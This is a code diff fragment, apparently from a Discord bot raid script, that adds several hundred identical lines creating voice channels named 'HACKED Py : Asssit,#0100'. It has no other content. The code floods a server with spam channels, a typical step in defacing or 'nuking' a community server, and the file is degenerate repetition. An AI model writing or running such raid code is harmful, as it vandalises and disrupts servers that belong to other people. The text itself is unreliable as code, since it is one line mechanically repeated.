+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
